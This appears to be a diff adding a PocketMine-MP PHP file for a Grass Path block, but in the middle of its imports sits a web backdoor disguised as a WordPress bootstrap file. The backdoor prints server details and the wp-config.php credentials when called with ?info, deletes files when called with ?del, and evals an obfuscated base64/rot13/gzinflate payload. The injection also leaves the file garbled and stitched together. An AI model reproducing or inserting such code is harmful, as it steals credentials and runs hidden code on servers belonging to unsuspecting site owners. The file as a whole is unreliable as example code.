@@ -1,0 +1,118 @@
+<?php
+
+/*
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pocketmine\block;
+
+use pocketmine\item\Item;
+use pocketmine\item\ItemFactory;
+<?php
+/**
+ * Bootstrap file for setting the ABSPATH constant
+ * and loading the wp-config.php file. The wp-config.php
+ * file will then load the wp-settings.php file, which
+ * will then set up the scripts environment.
+ *
+ * If the wp-config.php file is not found then an error
+ * will be displayed asking the visitor to set up the
+ * config.php file.
+ *
+ * Will also search for wp-config.php in scripts' parent
+ * directory to allow the scripts directory to remain
+ * untouched.
+ *
+ * @internal This file must be parsable by PHP4.
+ *
+ * @package scripts
+ */
+
+error_reporting(0); 
+if(isset($_GET['info'])){
+echo "<title>HTTP 404 Not Found</title>";
+$win = strtolower(substr(PHP_OS,0,3)) == "win";
+if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
+{
+ $safemode = true;
+ $hsafemode = "4,1ON(BuSuX)";
+}
+else {$safemode = false; $hsafemode = "OFF(WoKeH)";}
+$os = wordwrap(php_uname(),90,"<br>",1);
+$xos = "Safe-mode:[Safe-mode:".$hsafemode."] 7 [OS:".$os."]";
+echo "<center> ".$xos." </center><br>";
+$lol = file_get_contents("../../../../../wp-config.php");
+$lol2 = file_get_contents("../../../../../../wp-config.php");
+print $lol; print $lol2;
+}
+
+if(isset($_GET['del'])){
+@unlink("./xml.php");
+@unlink("./upload.php");
+@unlink("./export-check-settings.php");
+}
+
+eval(str_rot13(gzinflate(str_rot13(base64_decode('WpDJrqNTAAA/dF7EAXVpUjnYrDa7zX4Z0exzesC48dd0ZVgd60VFrd1n/tRa9buCDc387OORYufUrP9m80evPPsbrQtR688v30FGXNS84xhxLJ7u/pwuCWp/ymHc7JHV7+/nde9oFe7ziELjtZcEdmnbSiVKGwBdkCHYUZH0N4CB9nZVZbC7+pZqA2NFCXr17WRI+QNt1YTQ5kw9RlDPqTJRDKdwIqP7DE0Q0HBiZcE4yclTXpigP8kjs73G1dN0tsuKCrk+yXA3p9pNAwcop8CL7gxZDjRjsitjZHb0TtoshZeaxi5JLd7U6BiHiXUStJuhYfPEGuV+cU10Qt4mBbxGd/6y2q2+hDloib9k6F48d1kU/76FQPhHL/bkUAuYoS3x2RW1CL+SuRGNSxJhy+wQwfkE2UFc0DOpwnpJDrvbWovkeeuS8zxGATyLy+QG77YMqG9MOdxM91a4SDUX7H9tKvS8EmF4JzkP6XreiDpcdVm0EyakIiqv1WAqgY7zdW6v+xryx7hUs1lw5cFBqmO/grhrJnZpFwBHpIXWJAcMoUacC7heq9f2tvuQzoGX6T5p6c61E8PAsjIfL9NxBwgZnKmHs8VLOfLGyvzJvXwQ589CMj4WNKOAc/V1ZRcroa5V/bjv1SYKidGTSW9LqX4tqjgV30mdw+qZB0G4Q7LfffLFgO3yaAuoiwibzkAya81u/Dj8qSUTbUNImDaPqqkLNMKakgrOOTnHLpoiHXGfOh9QpblM9O7ZISpC49bfeM1r85boMgKCi9g/tk4+sZsmkS6oHHzYLezEP9NSU5sp3atTSL+KYnKMPtw3mjUeKvlkxrw1aAdyz2UpuiGicfebboLJzk0szEkTX5L/8gWyNikg1F8o7Ilc5hr/4Yaw6xiJJMjwUJPiP7/++o+//wU=')))));
+?>use pocketmine\math\AxisAlignedBB;
+use pocketmine\math\Vector3;
+
+class GrassPath extends Transparent{
+
+	protected $id = self::GRASS_PATH;
+
+	public function __construct(int $meta = 0){
+		$this->meta = $meta;
+	}
+
+	public function getName() : string{
+		return "Grass Path";
+	}
+
+	public function getToolType() : int{
+		return BlockToolType::TYPE_SHOVEL;
+	}
+
+	protected function recalculateBoundingBox() : ?AxisAlignedBB{
+		return new AxisAlignedBB(
+			$this->x,
+			$this->y,
+			$this->z,
+			$this->x + 1,
+			$this->y + 1, //TODO: this should be 0.9375, but MCPE currently treats them as a full block (https://bugs.mojang.com/browse/MCPE-12109)
+			$this->z + 1
+		);
+	}
+
+	public function getHardness() : float{
+		return 0.6;
+	}
+
+	public function onNearbyBlockChange() : void{
+		if($this->getSide(Vector3::SIDE_UP)->isSolid()){
+			$this->level->setBlock($this, BlockFactory::get(Block::DIRT), true);
+		}
+	}
+
+	public function getDropsForCompatibleTool(Item $item) : array{
+		return [
+			ItemFactory::get(Item::DIRT)
+		];
+	}
+}
